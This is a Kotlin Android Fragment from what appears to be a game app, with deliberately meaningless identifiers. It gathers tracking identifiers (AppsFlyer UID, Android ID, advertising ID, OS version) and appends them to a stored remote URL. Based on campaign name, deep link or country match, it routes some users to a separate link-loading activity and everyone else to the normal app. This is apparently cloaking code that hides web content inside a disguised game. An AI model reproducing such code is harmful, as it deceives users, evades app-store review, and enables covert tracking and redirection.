package com.skgames.trafficridero.bgxuzu

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.fragment.app.Fragment
import com.appsflyer.AppsFlyerLib
import com.my.tracker.MyTracker
import com.skgames.trafficridero.Fioxozozs.Companion.okdsoskdadji
import com.skgames.trafficridero.Fioxozozs.Companion.dijsfjieji
import com.skgames.trafficridero.R
import com.skgames.trafficridero.frsauhsda.Heoksdijxijcjiz
import com.skgames.trafficridero.mkioxccxhu.Noxicjaswqs
import org.koin.android.ext.android.inject
import org.koin.core.qualifier.named


class Bgtxzychu : Fragment() {
    val ijcxijvij: SharedPreferences by inject(named("SharedPreferences"))
    private lateinit var soidia: Context






    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        val ockvxijvjixcjixvc = Build.VERSION.RELEASE
        val wiojsjidj = "sub_id_1="
        val zxciojjzcxozxc = "ad_id="

        val osdksdkosdadk = "sub_id_5="
        val ixcjvijxcjixjv = "naming"

        val dfhufd = Intent(activity, Noxicjaswqs::class.java)
        val sdijsdji = "deviceID="
        val ixcj = "sub_id_6="

        val osdoksdokdasokasdk = ijcxijvij.getString("mainId", null)
        val xcuhuzxchuzxchuzxc = ijcxijvij.getString("deepSt", null)
        val riojdsf = "deeporg"
        val soakskoasadajiajisd = "com.skgames.trafficridero"

        val iocjxvvjiijxcvxckxcvo = Intent(activity, Heoksdijxijcjiz::class.java)
        val eiojsad = "sub_id_4="

        val ovckkbvkobov = ijcxijvij.getString("country", null)

        val wiojsd = ijcxijvij.getString("appCamp", null)
        val xcuhhuzxchu = ijcxijvij.getString("apps", null)

        val ovkbkovkokobvokcvbk = ijcxijvij.getString(dijsfjieji, null)
        val wijdji = MyTracker.getTrackerParams()
        wijdji.setCustomUserId(ovkbkovkokobvokcvbk)
        val icjvc = ijcxijvij.getString("wv", null)

        val wjidsaisjd = ijcxijvij.getString("countryDev", null)


        val oxczkzxkkozxc = AppsFlyerLib.getInstance().getAppsFlyerUID(soidia)
        AppsFlyerLib.getInstance().setCollectAndroidID(true)

        ijcxijvij.edit().putString(okdsoskdadji, oxczkzxkkozxc).apply()

        val sdhusdhuajid = "$icjvc$wiojsjidj$wiojsd&$sdijsdji$oxczkzxkkozxc&$zxciojjzcxozxc$osdoksdokdasokasdk&$eiojsad$soakskoasadajiajisd&$osdksdkosdadk$ockvxijvjixcjixvc&$ixcj$ixcjvijxcjixjv"
        val xuchzhzuxc = "$icjvc$sdijsdji$ovkbkovkokobvokcvbk&$zxciojjzcxozxc$ovkbkovkokobvokcvbk&$eiojsad$soakskoasadajiajisd&$osdksdkosdadk$ockvxijvjixcjixvc&$ixcj$ixcjvijxcjixjv"
        val wodkoskdosdk = "$icjvc$wiojsjidj$xcuhuzxchuzxchuzxc&$sdijsdji$oxczkzxkkozxc&$zxciojjzcxozxc$osdoksdokdasokasdk&$eiojsad$soakskoasadajiajisd&$osdksdkosdadk$ockvxijvjixcjixvc&$ixcj$riojdsf"
        val cvhuucvhxcvx = "$icjvc$wiojsjidj$xcuhuzxchuzxchuzxc&$sdijsdji$ovkbkovkokobvokcvbk&$zxciojjzcxozxc$ovkbkovkokobvokcvbk&$eiojsad$soakskoasadajiajisd&$osdksdkosdadk$ockvxijvjixcjixvc&$ixcj$riojdsf"

        when(xcuhhuzxchu) {
            "1" ->
                if(wiojsd!!.contains("tdb2")) {
                    ijcxijvij.edit().putString("link", sdhusdhuajid).apply()
                    ijcxijvij.edit().putString("WebInt", "campaign").apply()
                    startActivity(iocjxvvjiijxcvxckxcvo)
                    activity?.finish()
                } else if (xcuhuzxchuzxchuzxc!=null||wjidsaisjd!!.contains(ovckkbvkobov.toString())) {

                    ijcxijvij.edit().putString("link", wodkoskdosdk).apply()
                    ijcxijvij.edit().putString("WebInt", "deepLink").apply()
                    startActivity(iocjxvvjiijxcvxckxcvo)
                    activity?.finish()
                } else {
                    startActivity(dfhufd)
                    activity?.finish()
                }
            "0" ->
                if(xcuhuzxchuzxchuzxc!=null) {
                    ijcxijvij.edit().putString("link", cvhuucvhxcvx).apply()
                    ijcxijvij.edit().putString("WebInt", "deepLinkNOApps").apply()
                    startActivity(iocjxvvjiijxcvxckxcvo)
                    activity?.finish()
                } else if (wjidsaisjd!!.contains(ovckkbvkobov.toString())) {
                    Log.d("WebTesting", xuchzhzuxc)
                    ijcxijvij.edit().putString("link", xuchzhzuxc).apply()
                    ijcxijvij.edit().putString("WebInt", "geo").apply()
                    startActivity(iocjxvvjiijxcvxckxcvo)
                    activity?.finish()
                } else {
                    startActivity(dfhufd)
                    activity?.finish()
                }
        }
    }
    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        return inflater.inflate(R.layout.cucxijcijd, container, false)
    }


    override fun onAttach(context: Context) {
        super.onAttach(context)
        soidia = context
    }
}
